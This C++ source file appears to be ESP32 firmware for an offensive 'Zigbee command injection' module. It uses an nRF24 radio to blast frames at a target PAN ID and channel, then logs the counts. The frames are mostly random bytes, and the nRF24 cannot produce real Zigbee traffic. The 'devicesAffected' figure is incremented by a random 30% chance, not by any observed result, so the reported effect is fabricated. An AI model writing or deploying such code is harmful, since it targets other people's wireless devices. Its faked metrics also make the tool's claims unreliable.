#include "zigbee_command_injection.h"
#include <LittleFS.h>
#include <RF24.h>
#include "tx_arm.h"

namespace ZigbeeCommandInjection {

CommandInjector::CommandInjector() : isRunning_(false) {}

InjectionResult CommandInjector::injectCommands(const InjectionConfig& config) {
  InjectionResult result;
  result.success = false;

  if (!TxArm::isArmed()) return result;

  isRunning_ = true;
  unsigned long startTime = millis();

  RF24 radio(22, 21);
  if (!radio.begin()) return result;

  uint8_t channel = ((config.targetChannel - 11) * 5) + 10; // Convert to RF24 channel
  if (channel > 125) channel = 125;
  radio.setChannel(channel);

  uint32_t commandCount = 0;
  uint32_t devicesAffected = 0;

  while (isRunning_ && (millis() - startTime) < config.durationMs) {
    // Construct Zigbee command frame
    uint8_t payload[32];
    payload[0] = 0x41; // Frame control (data frame)
    payload[1] = 0x88; // Sequence number
    payload[2] = (config.targetPanId) & 0xFF;
    payload[3] = (config.targetPanId >> 8) & 0xFF;

    // Zigbee command cluster
    for (int i = 4; i < 20; i++) {
      payload[i] = (esp_random() % 256);
    }

    // Send command
    radio.stopListening();
    radio.write(payload, 20);
    radio.startListening();

    commandCount++;

    if (config.broadcastCommands && (esp_random() % 100) < 30) {
      devicesAffected++;
    }

    delay(50);
  }

  result.commandsSent = commandCount;
  result.devicesAffected = devicesAffected;
  result.success = true;
  result.logFile = "/logs/handshakes/zigbee_injection.csv";

  if (!LittleFS.begin()) return result;
  File logFile = LittleFS.open("/logs/handshakes/zigbee_injection.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/zigbee_injection.csv", "a");
  }
  if (logFile) {
    logFile.printf("%lu,%u,%u\n", millis(), commandCount, devicesAffected);
    logFile.close();
  }
  LittleFS.end();

  radio.powerDown();
  isRunning_ = false;
  return result;
}

void CommandInjector::stop() {
  isRunning_ = false;
}

} // namespace ZigbeeCommandInjection
